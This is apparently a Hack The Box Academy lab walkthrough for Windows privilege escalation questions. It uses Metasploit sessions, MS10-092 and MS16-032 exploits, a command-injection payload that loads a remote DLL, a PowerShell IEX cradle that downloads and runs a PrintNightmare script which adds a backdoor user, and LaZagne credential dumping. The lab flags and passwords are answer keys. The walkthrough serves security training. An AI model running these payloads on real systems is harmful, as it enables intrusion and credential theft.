Then, students need to copy and paste the command from `msfconsole` (in here `rundll32.exe \\PWNIP\tXWM\test.dll,0`) into the Command Prompt on the Windows Target:

![Windows_Privilege_Escalation_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_50.png)

When students go back to `msfconsole`, they will notice that a `meterpreter` session has been established successfully:

```shell-session
[msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >> [SMB] NTLMv2-SSP Client     : 10.129.92.234
[SMB] NTLMv2-SSP Username   : WINLPE-2K8\htb-student
[SMB] NTLMv2-SSP Hash       : htb-student::WINLPE-2K8:16d64c2ff2c43048:d5dae572d222ae347835f88df96aa22b:01010000000000000012b5a13ed8d801a62bfbb7dba98735000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008000012b5a13ed8d8010600040002000000080030003000000000000000000000000020000095d49de5589ea361ef3d3cea3f9e05f0ab183729fe42116634cb71dbc5909b130a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0038003000000000000000000000000000

[*] Sending stage (175686 bytes) to 10.129.92.234
[*] Meterpreter session 1 opened (10.10.14.80:4444 -> 10.129.92.234:49159) at 2022-10-04 23:14:19 +0100
```

Students now need to press Enter, attach to session 1 with the `sessions` command, and then run `ps`:

Code: shell

```shell
sessions -i 1
ps
```

```shell-session
[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Users\htb-student) > ps

Process List
============

 PID   PPID  Name                 Arch  Session  User                    Path
 ---   ----  ----                 ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 148   2808  powershell.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 264   4     smss.exe
 276   452   svchost.exe
 352   344   csrss.exe
 384   344   wininit.exe
 
<SNIP>

 1220  452   vmtoolsd.exe
 1248  452   ManagementAgentHost
             .exe
 1304  2368  conhost.exe          x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
```

Subsequently, students will discover the process ID for `conhost.exe`, and then migrate to its process using `migrate`:

Code: shell

```shell
mirage 1304
```

```shell-session
(Meterpreter 1)(C:\Users\htb-student) > migrate 1304

[*] Migrating from 1700 to 1304...
[*] Migration completed successfully.
```

Thereafter, students need to background the `meterpreter` session, use the `exploit/windows/local/ms10_092_schelevator` exploit/module, and then set its options accordingly:

Code: shell

```shell
bg
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST PWNIP
set LPORT PWNPO
```

```shell-session
(Meterpreter 1)(C:\Windows\system32) > bg
[*] Backgrounding session 1...

[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> use exploit/windows/local/ms10_092_schelevator
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> set SESSION 1
SESSION => 1
[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> set LHOST 10.10.14.80
LHOST => 10.10.14.80
[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> set LPORT 4443
```

Finally, students can run the exploit with `exploit` or `run`:

Code: shell

```shell
exploit
```

```shell-session
[msf](Jobs:1 Agents:1) exploit(windows/local/ms10_092_schelevator) >> exploit

[*] Started reverse TCP handler on 10.10.14.80:4443
[*] Preparing payload at C:\Windows\TEMP\yfEtZAEmjbAY.exe
[*] Creating task: a6ntd94futT2
[*] SUCCESS: The scheduled task "a6ntd94futT2" has successfully been created.

<SNIP>
[*] Sending stage (200774 bytes) to 10.129.92.234
[*] SUCCESS: Attempted to run the scheduled task "a6ntd94futT2".
[*] Deleting the task...
[*] SUCCESS: The scheduled task "a6ntd94futT2" was successfully deleted.
[*] Meterpreter session 2 opened (10.10.14.80:4443 -> 10.129.92.234:49160) at 2022-10-04 23:28:26 +0100

(Meterpreter 2)(C:\Windows\system32) > 
```

From the elevated `meterpreter` shell, students need to drop into a Command Shell:

Code: shell

```shell
shell
```

```shell-session
(Meterpreter 2)(C:\Windows\system32) > shell

Process 1628 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

At last, students need to read the flag located at `C:\Users\Administrator\Desktop\flag.txt`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

```cmd-session
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt

L3gacy_st1ill_pr3valent!
```

Answer: `L3gacy_st1ill_pr3valent!`

# Windows Desktop Versions

## Question 1

### "Enumerate the target host and escalate privileges to SYSTEM. Submit the contents of the flag on the Administrator Desktop."

Students first need to connect to the spawned target with `rdesktop` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
rdesktop STMIP -u htb-student -p'HTB_@cademy_stdnt!'
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ rdesktop 10.129.11.189 -u htb-student -p'HTB_@cademy_stdnt!'
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=WINLPE-WIN7


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=WINLPE-WIN7
     Issuer: CN=WINLPE-WIN7
 Valid From: Tue May 26 03:45:06 2026
         To: Wed Nov 25 02:45:06 2026

  Certificate fingerprints:

       sha1: d5792b41e3491600d075be90fde9a49d1e10e426
     sha256: 312a44de48d7e11f5c1f3ee86ee52af378e1ca2861e7a4050f085525f5a55cfc


Do you trust this certificate (yes/no)? yes


<SNIP>
```

Then, students need to open PowerShell and enumerate host information using `systeminfo`:

Code: powershell

```powershell
systeminfo
```

```powershell-session
PS C:\Users\htb-student> systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:   
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          10/30/2022, 3:22:11 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,406 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 7,460 MB
Virtual Memory: In Use:    729 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-WIN7
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB2999226
                           [03]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.222.123
                                 [02]: fe80::31f3:a077:6f49:3e7c
                                 [03]: dead:beef::41d:578:3dfa:cf0c
                                 [04]: dead:beef::31f3:a077:6f49:3e7c
```

Students need to save the output into a file in Pwnbox/`PMVPN`. Thereafter, if not installed, students need to fetch [Windows-Exploit-Suggester](https://enterprise.hackthebox.com/academy-lab/65984/17660/modules/67/%5BWindows-Exploit-Suggester%5D\(https://github.com/AonCyberLabs/Windows-Exploit-Suggester\)) from GitHub (the raw version is fetched below):

Code: shell

```shell
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-3c5hvds0n7]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

--2022-11-22 07:43:48--  https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69175 (68K) [text/plain]
Saving to: ‘windows-exploit-suggester.py’

windows-exploit-suggester.py      100%[============================================================>]  67.55K  --.-KB/s    in 0.001s  

2022-11-22 07:43:48 (59.9 MB/s) - ‘windows-exploit-suggester.py’ saved [69175/69175]
```

Subsequently, students need to update the local copy of the Microsoft Vulnerability database:

Code: shell

```shell
python2 windows-exploit-suggester.py --update
```

```shell-session
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-3c5hvds0n7]─[~]
└──╼ [★]$ python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2026-05-27-mssb.xls
[*] done
```

Before running `windows-exploit-suggester.py` on the file containing `systeminfo`, students need to install the dependencies `setuptools-2.0` and `xlrd-1.0.0`:

Code: shell

```shell
wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
tar -xf setuptools-2.0.tar.gz && cd setuptools-2.0/ && sudo python2 setup.py install
```

```shell-session
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-3c5hvds0n7]─[~]
└──╼ [★]$ wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
tar -xf setuptools-2.0.tar.gz && cd setuptools-2.0/ && sudo python2 setup.py install

--2022-11-22 08:02:55--  https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.1.63, 151.101.65.63, 151.101.129.63, ...
Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.1.63|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 783643 (765K) [application/octet-stream]
Saving to: ‘setuptools-2.0.tar.gz’

setuptools-2.0.tar.gz             100%[============================================================>] 765.28K  --.-KB/s    in 0.006s  

2022-11-22 08:02:55 (116 MB/s) - ‘setuptools-2.0.tar.gz’ saved [783643/783643]

running install
running bdist_egg
running egg_info
<SNIP>
```

Students will proceed to install the `xlrd-1.0.0` dependency:

Code: shell

```shell
cd ~
wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
tar -xf xlrd-1.0.0.tar.gz && cd xlrd-1.0.0/ && sudo python2 setup.py install && cd ~
```

```shell-session
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-3c5hvds0n7]─[~]
└──╼ [★]$ cd ~
wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
tar -xf xlrd-1.0.0.tar.gz && cd xlrd-1.0.0/ && sudo python2 setup.py install && cd ~

--2022-11-22 08:03:53--  https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.1.63, 151.101.65.63, 151.101.129.63, ...
Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.1.63|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2563654 (2.4M) [application/octet-stream]
Saving to: ‘xlrd-1.0.0.tar.gz’

xlrd-1.0.0.tar.gz                 100%[============================================================>]   2.44M  --.-KB/s    in 0.01s   

2022-11-22 08:03:53 (212 MB/s) - ‘xlrd-1.0.0.tar.gz’ saved [2563654/2563654]

running install
running bdist_egg
running egg_info
<SNIP>
```

Afterward, students need to use `windows-exploit-suggester.py` on the file containing the output of the `systeminfo` command, using the database file that was generated by running `python2.7 windows-exploit-suggester.py --update`. Note, that the name of the database generated previously will be using the YEAR-MONTH-DATE (YYYY-MM-DD) format:

Code: shell

```shell
python2 windows-exploit-suggester.py --database 20XX-XX-XX-mssb.xls --systeminfo systemInfo.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-3c5hvds0n7]─[~]
└──╼ [★]$ python2.7 windows-exploit-suggester.py --database 2022-11-22-mssb.xls --systeminfo systemInfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*] 
<SNIP>
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
<SNIP>
[*] done
```

Students will notice that the system is vulnerable to `MS16-032`. Subsequently, on the Windows target, students need to navigate to the `C:\Tools` directory and modify the execution policy to `bypass` with `Set-ExecutionPolicy`:

Code: powershell

```powershell
cd C:\Tools
Set-ExecutionPolicy bypass -scope process
```

```powershell-session
PS C:\Users\htb-student> cd C:\Tools
PS C:\Tools> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the
execution policy might expose you to the security risks described in the
about_Execution_Policies help topic. Do you want to change the execution policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

Then, students need to import the `MS-16-032` PowerShell module and run it:

Code: powershell

```powershell
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

```powershell-session
PS C:\Tools> Import-Module .\Invoke-MS16-032.ps1
PS C:\Tools> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2108

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2104
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

![Windows_Privilege_Escalation_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_51.png)

Students will see a Command Prompt launch with System privileges. At last, students need to use this CMD shell to read the flag file "flag.txt" located at `C:\Users\Administrator\Desktop\`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

```cmd-session
C:\Tools> type C:\Users\Administrator\Desktop\flag.txt

Cm0n_l3ts_upgRade_t0_win10!
```

Answer: `Cm0n_l3ts_upgRade_t0_win10!`

# Windows Privilege Escalation Skills Assessment - Part I

## Question 1

### "Which two KBs are installed on the target system? (Answer format: 32100000&3210060)"

Students first need to run `Nmap` against the spawned target to enumerate possible attack vectors:

Code: shell

```shell
sudo nmap -sC -sV -Pn STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-3kvw9siub9]─[~]
└──╼ [★]$ sudo nmap -sC -sV -Pn 10.129.225.46

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 16:52 GMT
Nmap scan report for 10.129.225.46
Host is up (0.077s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: DEV Connection Tester
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-31T16:52:30+00:00
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2022-10-30T16:51:47
|_Not valid after:  2023-05-01T16:51:47
|_ssl-date: 2022-10-31T16:52:32+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```

From the output of `Nmap`, students will notice that there is a web server on port 80 listening, thus, they need to navigate to it using `Firefox`:

![Windows_Privilege_Escalation_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_52.png)

Subsequently, students need to test the "Dev Connection Tester" web application and discover that the web server is able to ping other devices on the LAN. This app is also vulnerable to a command injection:

Code: cmd

```cmd
127.0.0.1 && whoami
```

![Windows_Privilege_Escalation_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_53.png)

Afterward, students need to launch `metasploit` and use the `exploit/windows/smb/smb_delivery` module:

Code: shell

```shell
sudo msfconsole -q
use exploit/windows/smb/smb_delivery
```

```shell-session
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-3kvw9siub9]─[~]
└──╼ [★]$ sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/smb_delivery 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Then, students need to set the options of the module accordingly and launch it:

Code: shell

```shell
set SRVHOST tun0
set LHOST tun0
exploit
```

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set SRVHOST tun0

SRVHOST => 10.10.14.72
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.72:4444 
[*] Server is running. Listening on 10.10.14.72:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.72\xYBi\test.dll,0
```

Subsequently, students need to use the generated command as part of the final payload:

Code: cmd

```cmd
127.0.0.1 && rundll32.exe \\PWNIP\xYBi\test.dll,0
```

![Windows_Privilege_Escalation_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_54.png)

Students will notice that a `meterpreter` session has been established successfully:

```shell-session
[msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >> [*] Sending stage (175686 bytes) to 10.129.225.46
[*] Meterpreter session 1 opened (10.10.14.72:4444 -> 10.129.225.46:49671) at 2022-10-31 17:16:39 +0000
```

Afterward, students need to press Enter and then attach to the active `meterpreter` session:

Code: shell

```shell
sessions -i 1
```

```shell-session
[msf](Jobs:1 Agents:1) exploit(windows/smb/smb_delivery) >> sessions -i 1

[*] Starting interaction with 1...

(Meterpreter 1)(c:\windows\system32\inetsrv) > 
```

And then, students need to drop into a system command shell:

Code: shell

```shell
shell
```

```cmd-session
(Meterpreter 1)(c:\windows\system32\inetsrv) > shell

Process 3008 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

At last, students need to enumerate the installed KBs using `wmic`:

Code: cmd

```cmd
wmic qfe
```

```cmd-session
c:\windows\system32\inetsrv>wmic qfe

wmic qfe

Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=3199986  WINLPE-SKILLS1-  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016                                      
http://support.microsoft.com/?kbid=3200970  WINLPE-SKILLS1-  Security Update               KB3200970               NT AUTHORITY\SYSTEM  11/21/2016
```

Students will find both installed KBs to be `3199986&3200970`.

Answer: `3199986&3200970`

# Windows Privilege Escalation Skills Assessment - Part I

## Question 2

### "Find the password for the ldapadmin account somewhere on the system."

Students first need to clone the repository for [PrintNightmare](https://github.com/calebstewart/CVE-2021-1675.git) to Pwnbox/`PMVPN`:

Code: shell

```shell
git clone https://github.com/calebstewart/CVE-2021-1675.git
```

```shell-session
┌─[eu-academy-1]─[10.10.14.114]─[htb-ac330204@htb-nu3i5e2cip]─[~]
└──╼ [★]$ git clone https://github.com/calebstewart/CVE-2021-1675.git

Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37
Receiving objects: 100% (40/40), 127.17 KiB | 2.49 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```

Then, students need to open `CVE-2021-1675.ps1` with Visual Studio and append (or use `echo` instead, as in `echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1`)

Code: cmd

```cmd
Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"
```

![Windows_Privilege_Escalation_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_55.png)

Subsequently, students need to start a web server in the same directory as where `CVE-2021-1675.ps1` is:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[eu-academy-1]─[10.10.14.114]─[htb-ac330204@htb-nu3i5e2cip]─[~/CVE-2021-1675]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Utilizing the command injection vulnerability, students need use PowerShell's IEX to invoke the script:

Code: cmd

```cmd
127.0.0.1 | powershell IEX(New-Object Net.Webclient).downloadString('http://PWNIP:PWNPO/CVE-2021-1675.ps1')
```

Students will observe that a new user has been added:

![Windows_Privilege_Escalation_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_56.png)

Now, `lazange.exe` must be downloaded and placed into the same directory where the Python web server is listening to prepare for the next phase of the attack:

Code: shell

```shell
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~/pwdump8]
└──╼ [★]$ wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
```

Subsequently, students need to connect with RDP as the newly created user, utilizing the credentials `Hacker:Pwnd1234!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Hacker /p:'Pwnd1234!' /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.114]─[htb-ac330204@htb-nu3i5e2cip]─[~/CVE-2021-1675]
└──╼ [★]$ xfreerdp /v:10.129.23.27 /u:Hacker /p:'Pwnd1234!' /dynamic-resolution

[16:23:31:652] [10024:10025] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:23:31:652] [10024:10025] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:23:31:652] [10024:10025] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
```

Students then need to open PowerShell as administrator, navigate to `C:\Users\Public\Downloads\` and transfer over `lazagne.exe`:

Code: powershell

```powershell
cd C:\Users\Public\Downloads\
wget "http://PWNIP:PWNPO/lazagne.exe" -o "lazagne.exe"
```

```powershell-session
PS C:\Windows\system32> cd C:\Users\Public\Downloads\
PS C:\Users\Public\Downloads> wget "http://10.10.14.114:8080/lazagne.exe" -o "lazagne.exe"
```

At last, students need to run `lazagne.exe` with the `all` option:

Code: powershell

```powershell
.\lazagne.exe all
```

```powershell-session
PS C:\Users\Public\Downloads> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

<SNIP>

###### User: Administrator #######

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
AuthenticationMethod: SIMPLE
Login: ldapadmin
Password: car3ful_st0rinG_cr3d$
Host: dc01.inlanefreight.local
Port: 389
```

From the output of `LaZagne`, students will know that the password of `ldapadmin` is `car3ful_st0rinG_cr3d$`.

Answer: `car3ful_st0rinG_cr3d$`

# Windows Privilege Escalation Skills Assessment - Part I

## Question 3

### "Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop."

Using the previously established RDP session, students need to open PowerShell as administrator, navigate to `C:\Users\Administrator\Desktop`, and then read the flag file `flag.txt`:

Code: powershell

```powershell
cd C:\Users\Administrator\Desktop\
type flag.txt
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\Administrator\Desktop\

PS C:\Users\Administrator\Desktop> type flag.txt

Ev3ry_sysadm1ns_n1ghtMare!
```

Answer: `Ev3ry_sysadm1ns_n1ghtMare`

# Windows Privilege Escalation Skills Assessment - Part I

## Question 4

### "After escalating privileges, locate a file named confidential.txt. Submit the contents of the file."

Using the previously established RDP session, students need to open File Explorer and navigate to `C:\Users\Administrator\Music` where they will open `confidential.txt` to find the contents `5e5a7dafa79d923de3340e146318c31a`:

![Windows_Privilege_Escalation_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_57.png)

Answer: `5e5a7dafa79d923de3340e146318c31a`

# Windows Privilege Escalation Skills Assessment - Part II

## Question 1

### "Find the left behind cleartext credentials for the iamtheadministrator domain account."

Students first need to authenticate as `htb-student:HTB_@cademy_stdnt!` to the spawned target using `xfreerdp`:

Code: shell

```shell
 xfreerdp /v:STMIP /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.33 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution

[14:28:03:885] [2223:2224] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[14:28:03:885] [2223:2224] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[14:28:03:885] [2223:2224] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, students need to open Command Prompt, navigate to `C:\` and use `findstr` to search for cleartext credentials:

Code: cmd

```cmd
cd C:\
findstr /spin "iamtheadministrator" *.*
```

```cmd-session
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>cd C:\

C:\>findstr /spin "iamtheadministrator" *.*

FINDSTR: Cannot open pagefile.sys
FINDSTR: Cannot open Program Files\UNP\UpdateNotificationMgr\.UpdateNotificationMgr_LockFile
FINDSTR: Cannot open ProgramData\Microsoft\Crypto\RSA\MachineKeys\f686aace6942fb7f7ceb231212eef4a4_877168ed-3a96-45d8-9527-edd88a60096b
FINDSTR: Cannot open ProgramData\Microsoft\User Account Pictures\Administrator.dat
<SNIP>
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
FINDSTR: Cannot open Windows\Panther\UnattendGC\setupact.log
FINDSTR: Cannot open Windows\Panther\UnattendGC\setuperr.log
```

Students will discover the directory `Windows\Panther`, thus, they need to navigate to it to check its contents:

Code: cmd

```cmd
cd C:\Windows\Panther
dir
```

```cmd-session
C:\>cd C:\Windows\Panther
C:\Windows\Panther>dir

 Volume in drive C has no label.
 Volume Serial Number is 823E-9601

 Directory of C:\Windows\Panther

06/06/2021  12:20 PM    <DIR>          .
06/06/2021  12:20 PM    <DIR>          ..
05/25/2021  08:51 PM            44,525 cbs.log
05/25/2021  08:52 PM                68 Contents0.dir
05/25/2021  07:54 PM                68 Contents1.dir
05/25/2021  07:52 PM             1,554 DDACLSys.log
05/25/2021  07:54 PM             6,032 diagerr.xml
05/25/2021  07:54 PM            19,427 diagwrn.xml
06/04/2021  08:38 PM    <DIR>          FastCleanup
05/25/2021  08:52 PM            28,812 MainQueueOnline0.que
05/25/2021  07:54 PM            27,456 MainQueueOnline1.que
11/07/2022  06:26 AM           315,392 setup.etl
05/25/2021  07:52 PM    <DIR>          setup.exe
